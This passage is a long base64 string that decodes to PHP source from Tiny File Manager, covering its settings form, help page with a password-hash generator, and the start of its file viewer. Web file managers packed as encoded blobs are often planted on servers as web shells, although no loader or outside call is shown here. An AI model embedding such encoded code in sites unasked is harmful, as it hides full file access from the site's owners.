jb2RlKCRwYXJlbnQpID8+JmFtcDtjb3B5PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjb3B5KSA/PiI+PGkgY2xhc3M9ImZhIGZhLWNoZXZyb24tY2lyY2xlLWxlZnQiPjwvaT4gLi48L2E+PC9saT4NCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICB9DQogICAgICAgICAgICBmb3JlYWNoICgkZm9sZGVycyBhcyAkZikgew0KICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICA8bGk+DQogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCAuICcvJyAuICRmLCAnLycpKSA/PiZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSgkY29weSkgPz4iPjxpIGNsYXNzPSJmYSBmYS1mb2xkZXItbyI+PC9pPiA8P3BocCBlY2hvIGZtX2NvbnZlcnRfd2luKCRmKSA/PjwvYT4NCiAgICAgICAgICAgICAgICA8L2xpPg0KICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgID8+DQogICAgICAgIDwvdWw+DQogICAgPC9kaXY+DQo8P3BocA0KICAgIGZtX3Nob3dfZm9vdGVyKCk7DQogICAgZXhpdDsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZXR0aW5ncyddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCiAgICBnbG9iYWwgJGNmZywgJGxhbmcsICRsYW5nX2xpc3Q7DQo/Pg0KDQogICAgPGRpdiBjbGFzcz0iY29sLW1kLTggb2Zmc2V0LW1kLTIgcHQtMyI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgPGg2IGNsYXNzPSJjYXJkLWhlYWRlciBkLWZsZXgganVzdGlmeS1jb250ZW50LWJldHdlZW4iPg0KICAgICAgICAgICAgICAgIDxzcGFuPjxpIGNsYXNzPSJmYSBmYS1jb2ciPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz48L3NwYW4+DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iP3A9PD9waHAgZWNobyBGTV9QQVRIID8+IiBjbGFzcz0idGV4dC1kYW5nZXIiPjxpIGNsYXNzPSJmYSBmYS10aW1lcy1jaXJjbGUtbyI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJykgPz48L2E+DQogICAgICAgICAgICA8L2g2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICA8Zm9ybSBpZD0ianMtc2V0dGluZ3MtZm9ybSIgYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZGF0YS10eXBlPSJhamF4IiBvbnN1Ym1pdD0icmV0dXJuIHNhdmVfc2V0dGluZ3ModGhpcykiPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0eXBlIiB2YWx1ZT0ic2V0dGluZ3MiIGFyaWEtbGFiZWw9ImhpZGRlbiIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1sYW5ndWFnZSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnTGFuZ3VhZ2UnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1zZWxlY3QiIGlkPSJqcy1sYW5ndWFnZSIgbmFtZT0ianMtbGFuZ3VhZ2UiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBnZXRTZWxlY3RlZCgkbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsICRsYW5nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkbGFuZyA9PSAkbCkgPyAnc2VsZWN0ZWQnIDogJyc7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGxhbmdfbGlzdCBhcyAkayA9PiAkdikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT0nJGsnICIgLiBnZXRTZWxlY3RlZCgkaykgLiAiPiR2PC9vcHRpb24+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtdC0zIG1iLTMgcm93ICI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1lcnJvci1yZXBvcnQiIGNsYXNzPSJjb2wtc20tMyBjb2wtZm9ybS1sYWJlbCI+PD9waHAgZWNobyBsbmcoJ0Vycm9yUmVwb3J0aW5nJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tY2hlY2sgZm9ybS1zd2l0Y2giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY2hlY2staW5wdXQiIHR5cGU9ImNoZWNrYm94IiByb2xlPSJzd2l0Y2giIGlkPSJqcy1lcnJvci1yZXBvcnQiIG5hbWU9ImpzLWVycm9yLXJlcG9ydCIgdmFsdWU9InRydWUiIDw/cGhwIGVjaG8gJHJlcG9ydF9lcnJvcnMgPyAnY2hlY2tlZCcgOiAnJzsgPz4gLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIHJvdyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1zaG93LWhpZGRlbiIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnU2hvd0hpZGRlbkZpbGVzJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tY2hlY2sgZm9ybS1zd2l0Y2giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY2hlY2staW5wdXQiIHR5cGU9ImNoZWNrYm94IiByb2xlPSJzd2l0Y2giIGlkPSJqcy1zaG93LWhpZGRlbiIgbmFtZT0ianMtc2hvdy1oaWRkZW4iIHZhbHVlPSJ0cnVlIiA8P3BocCBlY2hvICRzaG93X2hpZGRlbl9maWxlcyA/ICdjaGVja2VkJyA6ICcnOyA/PiAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KDQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMgcm93Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImpzLWhpZGUtY29scyIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnSGlkZUNvbHVtbnMnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tOSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1jaGVjayBmb3JtLXN3aXRjaCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jaGVjay1pbnB1dCIgdHlwZT0iY2hlY2tib3giIHJvbGU9InN3aXRjaCIgaWQ9ImpzLWhpZGUtY29scyIgbmFtZT0ianMtaGlkZS1jb2xzIiB2YWx1ZT0idHJ1ZSIgPD9waHAgZWNobyAkaGlkZV9Db2xzID8gJ2NoZWNrZWQnIDogJyc7ID8+IC8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyByb3ciPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ianMtMy0xIiBjbGFzcz0iY29sLXNtLTMgY29sLWZvcm0tbGFiZWwiPjw/cGhwIGVjaG8gbG5nKCdUaGVtZScpID8+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS01Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGNsYXNzPSJmb3JtLXNlbGVjdCB3LTEwMCB0ZXh0LWNhcGl0YWxpemUiIGlkPSJqcy0zLTAiIG5hbWU9ImpzLXRoZW1lLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSdsaWdodCcgPD9waHAgaWYgKCR0aGVtZSA9PSAibGlnaHQiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICJzZWxlY3RlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gPz4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnbGlnaHQnKSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0nZGFyaycgPD9waHAgaWYgKCR0aGVtZSA9PSAiZGFyayIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gInNlbGVjdGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSA/Pj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gbG5nKCdkYXJrJykgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyByb3ciPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTEwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyI+IDxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NhdmUnKTsgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8c21hbGwgY2xhc3M9InRleHQtYm9keS1zZWNvbmRhcnkiPiogPD9waHAgZWNobyBsbmcoJ1NvbWV0aW1lcyB0aGUgc2F2ZSBhY3Rpb24gbWF5IG5vdCB3b3JrIG9uIHRoZSBmaXJzdCB0cnksIHNvIHBsZWFzZSBhdHRlbXB0IGl0IGFnYWluJykgPz4uPC9zcGFuPg0KICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCjw/cGhwDQogICAgZm1fc2hvd19mb290ZXIoKTsNCiAgICBleGl0Ow0KfQ0KDQppZiAoaXNzZXQoJF9HRVRbJ2hlbHAnXSkpIHsNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCiAgICBnbG9iYWwgJGNmZywgJGxhbmc7DQo/Pg0KDQogICAgPGRpdiBjbGFzcz0iY29sLW1kLTggb2Zmc2V0LW1kLTIgcHQtMyI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgPGg2IGNsYXNzPSJjYXJkLWhlYWRlciBkLWZsZXgganVzdGlmeS1jb250ZW50LWJldHdlZW4iPg0KICAgICAgICAgICAgICAgIDxzcGFuPjxpIGNsYXNzPSJmYSBmYS1leGNsYW1hdGlvbi1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0hlbHAnKSA/Pjwvc3Bhbj4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCBlY2hvIEZNX1BBVEggPz4iIGNsYXNzPSJ0ZXh0LWRhbmdlciI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZS1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYT4NCiAgICAgICAgICAgIDwvaDY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb2wtc20tNiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8cD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxoMz48YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vcHJhc2F0aG1hbmkvdGlueWZpbGVtYW5hZ2VyIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImFwcC12LXRpdGxlIj4gVGlueSBGaWxlIE1hbmFnZXIgPD9waHAgZWNobyBWRVJTSU9OOyA/PjwvYT48L2gzPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHA+QXV0aG9yOiBQUkHFmkFUSCBNQU7EsDwvcD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxwPk1haWwgVXM6IDxhIGhyZWY9Im1haWx0bzpjY3Bwcm9ncmFtbWVyc0BnbWFpbC5jb20iPmNjcHByb2dyYW1tZXJzIFthdF0gZ21haWwgW2RvdF0gY29tPC9hPiA8L3A+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTYiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJsaXN0LWdyb3VwIGxpc3QtZ3JvdXAtZmx1c2giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3ByYXNhdGhtYW5pL3RpbnlmaWxlbWFuYWdlci93aWtpIiB0YXJnZXQ9Il9ibGFuayI+PGkgY2xhc3M9ImZhIGZhLXF1ZXN0aW9uLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnSGVscCBEb2N1bWVudHMnKSA/PiA8L2E+IDwvbGk+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIj48YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vcHJhc2F0aG1hbmkvdGlueWZpbGVtYW5hZ2VyL2lzc3VlcyIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1idWciPjwvaT4gPD9waHAgZWNobyBsbmcoJ1JlcG9ydCBJc3N1ZScpID8+PC9hPjwvbGk+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIj48YSBocmVmPSJqYXZhc2NyaXB0OnNob3dfbmV3X3B3ZCgpOyI+PGkgY2xhc3M9ImZhIGZhLWxvY2siPjwvaT4gPD9waHAgZWNobyBsbmcoJ0dlbmVyYXRlIG5ldyBwYXNzd29yZCBoYXNoJykgPz48L2E+PC9saT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgfSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGpzLW5ldy1wd2QgaGlkZGVuIG10LTIiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9ImZvcm0taW5saW5lIiBvbnN1Ym1pdD0icmV0dXJuIG5ld19wYXNzd29yZF9oYXNoKHRoaXMpIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0eXBlIiB2YWx1ZT0icHdkaGFzaCIgYXJpYS1sYWJlbD0iaGlkZGVuIiBhcmlhLWhpZGRlbj0idHJ1ZSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBtYi0yIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ic3RhdGljRW1haWwyIj48P3BocCBlY2hvIGxuZygnR2VuZXJhdGUgbmV3IHBhc3N3b3JkIGhhc2gnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBteC1zbS0zIG1iLTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJpbnB1dFBhc3N3b3JkMiIgY2xhc3M9InNyLW9ubHkiPjw/cGhwIGVjaG8gbG5nKCdQYXNzd29yZCcpID8+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgYnRuLXNtIiBpZD0iaW5wdXRQYXNzd29yZDIiIG5hbWU9ImlucHV0UGFzc3dvcmQyIiBwbGFjZWhvbGRlcj0iPD9waHAgZWNobyBsbmcoJ1Bhc3N3b3JkJykgPz4iIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIGJ0bi1zbSBtYi0yIj48P3BocCBlY2hvIGxuZygnR2VuZXJhdGUnKSA/PjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRleHRhcmVhIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjIiIHJlYWRvbmx5IGlkPSJqcy1wd2QtcmVzdWx0Ij48L3RleHRhcmVhPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCjw/cGhwDQogICAgZm1fc2hvd19mb290ZXIoKTsNCiAgICBleGl0Ow0KfQ0KDQovLyBmaWxlIHZpZXdlcg0KaWYgKGlzc2V0KCRfR0VUWyd2aWV3J10pKSB7DQogICAgJGZpbGUgPSAkX0dFVFsndmlldyddOw0KICAgICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSwgZmFsc2UpOw0KICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOw0KICAgIGlmICgkZmlsZSA9PSAnJyB8fCAhaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSB8fCAhZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQoNCiAgICBmbV9zaG93X2hlYWRlcigpOyAvLyBIRUFERVINCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgNCg0KICAgICRmaWxlX3VybCA9IEZNX1JPT1RfVVJMIC4gZm1fY29udmVydF93aW4oKEZNX1BBVEggIT0gJycgPyAnLycgLiBGTV9QQVRIIDogJycpIC4gJy8nIC4gJGZpbGUpOw0KICAgICRmaWxlX3BhdGggPSAkcGF0aCAuICcvJyAuICRmaWxlOw0KDQogICAgJGV4dCA9IHN0cnRvbG93ZXIocGF0aGluZm8oJGZpbGVfcGF0aCwgUEFUSElORk9fRVhURU5TSU9OKSk7DQogICAgJG1pbWVfdHlwZSA9IGZtX2dldF9taW1lX3R5cGUoJGZpbGVfcGF0aCk7DQogICAgJGZpbGVzaXplX3JhdyA9IGZtX2dldF9zaXplKCRmaWxlX3BhdGgpOw0KICAgICRmaWxlc2l6ZSA9IGZtX2dldF9maWxlc2l6ZSgkZmlsZXNpemVfcmF3KTsNCg0KICAgICRpc196aXAgPSBmYWxzZTsNCiAgICAkaXNfZ3ppcCA9IGZhbHNlOw0KICAgICRpc19pbWFnZSA9IGZhbHNlOw0KICAgICRpc19hdWRpbyA9IGZhbHNlOw0KICAgICRpc192aWRlbyA9IGZhbHNlOw0KICAgICRpc190ZXh0ID0gZmFsc2U7DQogICAgJGlzX29ubGluZVZpZXdlciA9IGZhbHNlOw0KDQogICAgJHZpZXdfdGl0bGUgPSAnRmlsZSc7DQogICAgJGZpbGVuYW1lcyA9IGZhbHNlOyAvLyBmb3IgemlwDQogICAgJGNvbnRlbnQgPSAnJzsgLy8gZm9yIHRleHQNCiAgICAkb25saW5lX3ZpZXdlciA9IHN0cnRvbG93ZXIoRk1fRE9DX1ZJRVdFUik7DQoNCiAgICBpZiAoJG9ubGluZV92aWV3ZXIgJiYgJG9ubGluZV92aWV3ZXIgIT09ICdmYWxzZScgJiYgaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X29ubGluZVZpZXdlcl9leHRzKCkpKSB7DQogICAgICAgICRpc19vbmxpbmVWaWV3ZXIgPSB0cnVlOw0KICAgIH0gZWxzZWlmICgkZXh0ID09ICd6aXAnIHx8ICRleHQgPT0gJ3RhcicpIHsNCiAgICAgICAgJGlzX3ppcCA9IHRydWU7DQogICAgICAgICR2aWV3X3RpdGxlID0gJ0FyY2hpdmUnOw0KICAgICAgICAkZmlsZW5hbWVzID0gZm1fZ2V0X3ppZl9pbmZvKCRmaWxlX3BhdGgsICRleHQpOw0KICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBmbV9nZXRfaW1hZ2VfZXh0cygpKSkgew0KICAgICAgICAkaXNfaW1hZ2UgPSB0cnVlOw0KICAgICAgICAkdmlld190aXRsZSA9ICdJbWFnZSc7DQogICAgfSBlbHNlaWYgKGluX2FycmF5KCRleHQsIGZtX2dldF9hdWRpb19leHRzKCkpKSB7DQogICAgICAgICRpc19hdWRpbyA9IHRydWU7DQogICAgICAgICR2aWV3X3RpdGxlID0gJ0F1ZGlvJzsNCiAgICB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3ZpZGVvX2V4dHMoKSkpIHsNCiAgICAgICAgJGlzX3ZpZGVvID0gdHJ1ZTsNCiAgICAgICAgJHZpZXdfdGl0bGUgPSAnVmlkZW8nOw0KICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBmbV9nZXRfdGV4dF9leHRzKCkpIHx8IHN1YnN0cigkbWltZV90eXBlLCAwLCA0KSA9PSAndGV4dCcgfHwgaW5fYXJyYXkoJG1pbWVfdHlwZSwgZm1fZ2V0X3RleHRfbWltZXMoKSkpIHsNCiAgICAgICAgJGlzX3RleHQgPSB0cnVlOw0KICAgICAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlX3BhdGgpOw0KICAgIH0NCg0KPz4NCiAgICA8ZGl2IGNsYXNzPSJyb3ciPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiPg0KICAgICAgICAgICAgPHVsIGNsYXNzPSJsaXN0LWdyb3VwIHctNTAgbXktMyIgZGF0YS1icy10aGVtZT0iPD9waHAgZWNobyBGTV9USEVNRTsgPz4iPg0KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIGFjdGl2ZSIgYXJpYS1jdXJyZW50PSJ0cnVlIj48c3Ryb25nPjw/cGhwIGVjaG8gbG5nKCR2aWV3X3RpdGxlKSA/Pjo8L3N0cm9uZz4gPD9waHAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oJGZpbGUpKSA/PjwvbGk+DQogICAgICAgICAgICAgICAgPD9waHAgJGRpc3BsYXlfcGF0aCA9IGZtX2dldF9kaXNwbGF5X3BhdGgoJGZpbGVfcGF0aCk7ID8+DQogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxzdHJvbmc+PD9waHAgZWNobyAkZGlzcGxheV9wYXRoWydsYWJlbCddOyA/Pjo8L3N0cm9uZz4gPD9waHAgZWNobyAkZGlzcGxheV9wYXRoWydwYXRoJ107ID8+PC9saT4NCiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PHN0cm9uZz5GaWxlIHNpemU6PC9zdHJvbmc+IDw/cGhwIGVjaG8gKCRmaWxlc2l6ZV9yYXcgPD0gMTAwMCkgPyAiJGZpbGVzaXplX3JhdyBieXRlcyIgOiAkZmlsZXNpemU7ID8+PC9saT4NCiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PHN0cm9uZz5NSU1FLXR5cGU6PC9zdHJvbmc+IDw/cGhwIGVjaG8gJG1pbWVfdHlwZSA/PjwvbGk+DQogICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAvLyBaSVAgaW5mbw0KICAgICAgICAgICAgICAgIGlmICgoJGlzX3ppcCB8fCAkaXNfZ3ppcCkgJiYgJGZpbGVuYW1lcyAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRvdGFsX2ZpbGVzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgJHRvdGFsX2NvbXAgPSAwOw0KICAgICAgICAgICAgICAgICAgICAkdG90YWxfdW5jb21wID0gMDsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVuYW1lcyBhcyAkZm4pIHsNCiAgICAgICAg